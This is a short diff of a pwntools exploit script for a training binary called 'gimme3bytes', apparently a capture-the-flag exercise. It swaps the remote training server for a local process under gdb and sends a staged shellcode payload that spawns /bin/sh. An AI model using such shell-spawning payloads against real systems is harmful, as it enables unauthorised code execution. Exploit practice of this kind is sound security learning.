@@ -3,13 +3,13 @@ import pwn
 pwn.context.terminal = ['gnome-terminal', '-e']
 pwn.context.arch = 'amd64'
 
-r = pwn.remote("training.jinblack.it", 2004)
+# r = pwn.remote("training.jinblack.it", 2004)
 
-# r = pwn.process('./gimme3bytes')
+r = pwn.process('./gimme3bytes')
 
-# pwn.gdb.attach(r, """c
+pwn.gdb.attach(r, """c
 
-# """)
+""")
 
 input('wait')
 
@@ -31,6 +31,6 @@ shell_code = pwn.asm('''
 ''') + b'/bin/sh' + b'\x00' * 8
 
 
-r.send(load_shell_code + shell_code)
+r.send(load_shell_code + b'AAA' + shell_code)
 
 r.interactive()
